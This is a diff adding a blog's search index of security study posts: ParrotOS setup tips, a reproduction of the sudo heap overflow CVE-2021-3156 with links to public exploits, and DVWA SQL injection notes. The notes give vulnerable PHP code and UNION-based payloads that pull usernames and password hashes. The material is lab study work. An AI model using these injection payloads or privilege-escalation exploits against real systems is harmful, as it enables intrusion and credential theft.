@@ -1,0 +1,1031 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>About Parrot Security OS</title>
+    <url>/2021/11/04/About-Parrot-Security-OS/</url>
+    <content><![CDATA[<p>今天更换了ParrotOS，记录一下用得上的东西</p>
+<h3 id="系统相关"><a href="#系统相关" class="headerlink" title="系统相关"></a>系统相关</h3><p>更新源使用</p>
+<p><a href="https://parrotsec-cn.org/t/topic/81">https://parrotsec-cn.org/t/topic/81</a></p>
+<span id="more"></span>
+
+<p>tab自动补全在/etc/inputrc中添加</p>
+<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">set</span> completion-ignore-<span class="keyword">case</span> <span class="keyword">on</span></span><br></pre></td></tr></table></figure>
+
+<p>第三题查询dns解析，使用nslookup，进入交互模式</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&gt;<span class="builtin-name">set</span> <span class="attribute">type</span>=txt</span><br><span class="line">&gt;parrotsec-cn.org</span><br></pre></td></tr></table></figure>
+
+<p>解析记录中得到flag</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmlw0m6augj318a0g40yq.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmlw0m6augj318a0g40yq.jpg" alt="image-20210113110432395"></a></p>
+]]></content>
+      <tags>
+        <tag>Others</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2021-3156复现</title>
+    <url>/2021/11/04/CVE-2021-3156%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h3 id="CVE-2021-3156简介"><a href="#CVE-2021-3156简介" class="headerlink" title="CVE-2021-3156简介"></a>CVE-2021-3156简介</h3><p>CVE-2021-3156全称Heap-Based Buffer Overflow In Sudo（Sudo堆缓存溢出），由Qualys研究团队发现</p>
+<p>Sudo命令允许非root用户以root用户权限执行命令，被广泛安装在BSD、Linux、MacOS、Cisco等系统中</p>
+<p>漏洞可使任意非root账户提升至root权限</p>
+<span id="more"></span>
+
+<h3 id="受影响版本："><a href="#受影响版本：" class="headerlink" title="受影响版本："></a>受影响版本：</h3><p>Sudo 1.8.2 - 1.8.31p2</p>
+<p>Sudo 1.9.0 - 1.9.5p1</p>
+<h3 id="漏洞细节："><a href="#漏洞细节：" class="headerlink" title="漏洞细节："></a>漏洞细节：</h3><p>放链接因为我不会</p>
+<p><a href="https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt">https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt</a></p>
+<p><a href="https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit">https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</a></p>
+<p><a href="https://datafarm-cybersecurity.medium.com/exploit-writeup-for-cve-2021-3156-sudo-baron-samedit-7a9a4282cb31">https://datafarm-cybersecurity.medium.com/exploit-writeup-for-cve-2021-3156-sudo-baron-samedit-7a9a4282cb31</a></p>
+<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>国内文章的说法基本是执行</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attribute">sudoedit</span> -s /</span><br></pre></td></tr></table></figure>
+
+<p>报错若以sudoedit字样开头则存在漏洞，usage开头则不存在</p>
+<h5 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h5><p><a href="https://github.com/reverse-ex/CVE-2021-3156.git">https://github.com/reverse-ex/CVE-2021-3156.git</a></p>
+<h5 id="Redhat系列系统检测工具"><a href="#Redhat系列系统检测工具" class="headerlink" title="Redhat系列系统检测工具"></a>Redhat系列系统检测工具</h5><p><a href="https://access.redhat.com/security/vulnerabilities/RHSB-2021-002">https://access.redhat.com/security/vulnerabilities/RHSB-2021-002</a></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><a href="https://github.com/worawit/CVE-2021-3156.git">https://github.com/worawit/CVE-2021-3156.git</a></p>
+<p><a href="https://github.com/blasty/CVE-2021-3156.git">https://github.com/blasty/CVE-2021-3156.git</a></p>
+<h5 id="Debian-10"><a href="#Debian-10" class="headerlink" title="Debian 10"></a>Debian 10</h5><p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gox4wbky05j314m0rigv3.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gox4wbky05j314m0rigv3.jpg" alt="image-20210326111341340"></a></p>
+<h5 id="Ubuntu-18-05"><a href="#Ubuntu-18-05" class="headerlink" title="Ubuntu 18.05"></a>Ubuntu 18.05</h5><p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gox4tzvltyj314e0qq498.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gox4tzvltyj314e0qq498.jpg" alt="image-20210326111125332"></a></p>
+<h5 id="Ubuntu-20-04-1"><a href="#Ubuntu-20-04-1" class="headerlink" title="Ubuntu 20.04.1"></a>Ubuntu 20.04.1</h5><p>提权失败，猜想可能是更新是打了修复补丁</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gox52o8fymj314o0qqgxo.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gox52o8fymj314o0qqgxo.jpg" alt="image-20210326111948355"></a></p>
+<p>换了payload，确实是</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gox9nq6arij314607itcn.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gox9nq6arij314607itcn.jpg" alt="image-20210326135825834"></a></p>
+<h5 id="Centos-8"><a href="#Centos-8" class="headerlink" title="Centos 8"></a>Centos 8</h5><p>失败</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gox5mth7xzj314o0rqk0f.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gox5mth7xzj314o0rqk0f.jpg" alt="image-20210326113909554"></a></p>
+<p>换了payload</p>
+<p><a href="https://github.com/worawit/CVE-2021-3156.git">https://github.com/worawit/CVE-2021-3156.git</a></p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gox9ltkw7qj314604w76d.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gox9ltkw7qj314604w76d.jpg" alt="image-20210326135636744"></a></p>
+<p>成功</p>
+<h5 id="Kali-Linux"><a href="#Kali-Linux" class="headerlink" title="Kali Linux"></a>Kali Linux</h5><p>成功</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gox9rr3ep9j30ya074n14.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gox9rr3ep9j30ya074n14.jpg" alt="image-20210326140218835"></a></p>
+<h5 id="Parrot-Linux"><a href="#Parrot-Linux" class="headerlink" title="Parrot Linux"></a>Parrot Linux</h5><p>打过补丁</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gox9tasp35j316s0a2q80.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gox9tasp35j316s0a2q80.jpg" alt="image-20210326140347869"></a></p>
+<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><h5 id="升级sudo至最新版本"><a href="#升级sudo至最新版本" class="headerlink" title="升级sudo至最新版本"></a>升级sudo至最新版本</h5><p><a href="https://www.sudo.ws/download.html">https://www.sudo.ws/download.html</a></p>
+]]></content>
+      <tags>
+        <tag>Vulns</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DVWA Study Notes-SQL Injection</title>
+    <url>/2021/11/04/DVWA-Study-Notes-SQL-Injection/</url>
+    <content><![CDATA[<p>Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and aid teachers/students to teach/learn web application security in a class room environment.</p>
+<p><a href="https://dvwa.co.uk/">https://dvwa.co.uk/</a></p>
+<span id="more"></span>
+
+<h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h4 id="Difficulty-Low"><a href="#Difficulty-Low" class="headerlink" title="Difficulty: Low"></a>Difficulty: Low</h4><p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gph1dz2lx4j312c0ry0wg.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gph1dz2lx4j312c0ry0wg.jpg" alt="image-20210412162333917"></a></p>
+<p>As we can see ,there’s a input box and form that shows the ID, First name and Surname by receiving input ID.</p>
+<h4 id="Code-audit"><a href="#Code-audit" class="headerlink" title="Code audit"></a>Code audit</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	<span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check database</span></span><br><span class="line">	<span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">	<span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get results</span></span><br><span class="line">	<span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">		<span class="comment">// Get values</span></span><br><span class="line">		<span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">		<span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for end user</span></span><br><span class="line">		<span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>in line 8,$id is the variable that controll by user, so user can splicing special characters in the code so as to achieve the purpose of injection.</p>
+<p>The spliced code becomes:</p>
+<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$query  = &quot;<span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id = <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">database</span>(),group_concat(<span class="keyword">user</span>,<span class="keyword">password</span>) <span class="keyword">from</span> dvwa.users #<span class="string">&#x27;;&quot;;</span></span><br></pre></td></tr></table></figure>
+
+<p>By closing the single quotation mark, the UNION SELECT is spliced to find the user and password information.</p>
+<h4 id="Injection"><a href="#Injection" class="headerlink" title="Injection"></a>Injection</h4><h5 id="Determine-SQL-Injection"><a href="#Determine-SQL-Injection" class="headerlink" title="Determine SQL Injection"></a>Determine SQL Injection</h5><p>If we submit a Single quotes, the page will return an Error message.</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gph1h794n8j31130u042i.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gph1h794n8j31130u042i.jpg" alt="image-20210412162640479"></a></p>
+<p>That means this page has a Error-based SQL Injection vulnerability.</p>
+<p>So we can construct a payload and makes this page show us the information we want. Like the account credentials and etc.</p>
+<p>At first we should find the Database name of this back-end database.then get the table name, and finnally we get the username and password.</p>
+<h5 id="find-the-number-of-columns-in-current-table"><a href="#find-the-number-of-columns-in-current-table" class="headerlink" title="find the number of columns in current table"></a>find the number of columns in current table</h5><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1</span>&#x27; <span class="keyword">order</span> <span class="title">by</span> <span class="number">3</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>Error page is displayed</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpgy90omaaj31b80domyp.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpgy90omaaj31b80domyp.jpg" alt="image-20210412143501081"></a></p>
+<p>Change 3 to 2</p>
+<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1</span>&#x27; <span class="keyword">order</span> <span class="title">by</span> <span class="number">2</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>we see the normal page, so now we know it has 2 columns in the table.</p>
+<h5 id="Find-the-display-position"><a href="#Find-the-display-position" class="headerlink" title="Find the display position"></a>Find the display position</h5><figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1</span>&#x27; <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">111</span>,<span class="number">222</span> <span class="meta">#</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpgydh5aowj30kq0dkjsl.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpgydh5aowj30kq0dkjsl.jpg" alt="image-20210412143917931"></a></p>
+<h5 id="Find-the-Database-name"><a href="#Find-the-Database-name" class="headerlink" title="Find the Database name"></a>Find the Database name</h5><figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1</span>&#x27; <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="built_in">database</span>() <span class="meta">#</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpgyuke6hpj30tm0pc78i.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpgyuke6hpj30tm0pc78i.jpg" alt="image-20210412145543267"></a></p>
+<h5 id="Find-the-Table-name"><a href="#Find-the-Table-name" class="headerlink" title="Find the Table name"></a>Find the Table name</h5><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1&#x27;</span> <span class="function">union <span class="keyword">select</span> <span class="title">database</span>(<span class="params"></span>),<span class="title">group_concat</span>(<span class="params">table_name</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=database() <span class="meta">#</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpgyz02ocej31220pq0x2.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpgyz02ocej31220pq0x2.jpg" alt="image-20210412145959255"></a></p>
+<p>The experience told me that ‘users’ is the table which we want.If not we can change table name ‘users’ to ‘guestbook’ and continue.</p>
+<h5 id="Find-the-right-column"><a href="#Find-the-right-column" class="headerlink" title="Find the right column"></a>Find the right column</h5><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1&#x27;</span> <span class="function">union <span class="keyword">select</span> <span class="title">database</span>(<span class="params"></span>),<span class="title">group_concat</span>(<span class="params">column_name</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name</span> = <span class="string">&quot;users&quot;</span> <span class="meta">#</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpgz4bxhl9j313e0qcdk7.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpgz4bxhl9j313e0qcdk7.jpg" alt="image-20210412150505623"></a></p>
+<p>It is easy to find, the column user and password are the target column</p>
+<h5 id="Get-the-credentials"><a href="#Get-the-credentials" class="headerlink" title="Get the credentials"></a>Get the credentials</h5><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1&#x27; union <span class="keyword">select</span> <span class="keyword">database</span>(),group_concat(<span class="keyword">user</span>,<span class="keyword">password</span>) <span class="keyword">from</span> dvwa.users #</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpgzazp77fj313w0myjvr.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpgzazp77fj313w0myjvr.jpg" alt="image-20210412151130260"></a></p>
+<p>As we can see, the password has been encrypted by md5 in MySQL.</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpgzbx1sfhj31ae0ngac5.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpgzbx1sfhj31ae0ngac5.jpg" alt="image-20210412151223918"></a></p>
+<h4 id="Error-handling"><a href="#Error-handling" class="headerlink" title="Error handling"></a>Error handling</h4><p>Sometimes this error message will be encountered when querying</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpgz8u17ftj31jc0lgac3.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpgz8u17ftj31jc0lgac3.jpg" alt="image-20210412150925828"></a></p>
+<p>It is caused by the inconsistent sorting of query objects in the UNION SELECT.</p>
+<p>We need to set the column sorting method to be queried to be consistent to solve this error</p>
+<p>Set sorting rules utf8_unicode_ci to utf8_general_ci</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpgzajkcobj319e0u0wzv.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpgzajkcobj319e0u0wzv.jpg" alt="image-20210412151104538"></a></p>
+<hr>
+<h3 id="Difficulty-Medium"><a href="#Difficulty-Medium" class="headerlink" title="Difficulty: Medium"></a>Difficulty: Medium</h3><p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gphusy3q3zj31200k041a.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gphusy3q3zj31200k041a.jpg" alt="image-20210413092120240"></a></p>
+<p>There’s a drop-down menu that submit User ID to server by POST.</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gphuw6f3z7j31me0mytg5.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gphuw6f3z7j31me0mytg5.jpg" alt="image-20210413092426304"></a></p>
+<h4 id="Code-Audit"><a href="#Code-Audit" class="headerlink" title="Code Audit"></a>Code Audit</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$id</span> = mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Display values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is used later on in the index.php page</span></span><br><span class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"><span class="variable">$number_of_rows</span> = mysqli_fetch_row( <span class="variable">$result</span> )[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>In line 7, mysql_real_escape_string() will escape special characters in a string. In line 9, userid=$id tell us this is a digital error injection.Let’s try it.</p>
+<h4 id="Injection-1"><a href="#Injection-1" class="headerlink" title="Injection"></a>Injection</h4><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">-1</span>&#x27; <span class="keyword">or</span> <span class="number">89</span>=<span class="number">89</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gphuzijsufj31oo0pm45v.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gphuzijsufj31oo0pm45v.jpg" alt="image-20210413092739075"></a></p>
+<p>Looks like it has some basic hack-detecting technology</p>
+<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="symbol">1 </span><span class="keyword">or</span> <span class="number">1</span> like <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>Bying trying kinds of sqli-bypass, finally I get the normal page.</p>
+<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="symbol">1 </span>order by <span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>There’s 2 columns in current form, and also can make 2 point display information.</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gphw6jjplij31vy0t27de.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gphw6jjplij31vy0t27de.jpg" alt="image-20210413100859744"></a></p>
+<p>Send the same payload as Low to get password</p>
+<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="symbol">1 </span>UNION SELECT database(),group_concat(user,password) from dvwa.users</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpic54c57ej31ou0cigom.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpic54c57ej31ou0cigom.jpg" alt="image-20210413192112825"></a></p>
+<hr>
+<h3 id="Difficulty-Medium-1"><a href="#Difficulty-Medium-1" class="headerlink" title="Difficulty: Medium"></a>Difficulty: Medium</h3><h4 id="Code-audit-1"><a href="#Code-audit-1" class="headerlink" title="Code audit"></a>Code audit</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_SESSION</span> [ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_SESSION</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>As we see, they did a restrictions on the tail of query queue, LIMIT 1,but we can just comment them to</p>
+<p>In this page, they add a pop-up window for us to input the parameter.</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpiao0ndc8j31820u0aft.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpiao0ndc8j31820u0aft.jpg" alt="image-20210413183007994"></a></p>
+<p>By capturing the POST package, we can modify the ID parameter.But there’s a new problem is that the pop-up window would not show us the result of query but the original window does.</p>
+<p>So the solution is to input payload on pop-up page and watch the result on original page to judge whether the injection is succeed.</p>
+<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1&#x27; union <span class="keyword">select</span> <span class="keyword">database</span>(),group_concat(<span class="keyword">user</span>,<span class="keyword">password</span>) <span class="keyword">from</span> dvwa.users #</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpibwsw30fj31cg0mwn67.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpibwsw30fj31cg0mwn67.jpg" alt="image-20210413191312649"></a></p>
+<hr>
+<h3 id="Difficulty-Impassible"><a href="#Difficulty-Impassible" class="headerlink" title="Difficulty: Impassible"></a>Difficulty: Impassible</h3><h4 id="Code-audit-2"><a href="#Code-audit-2" class="headerlink" title="Code audit"></a>Code audit</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span 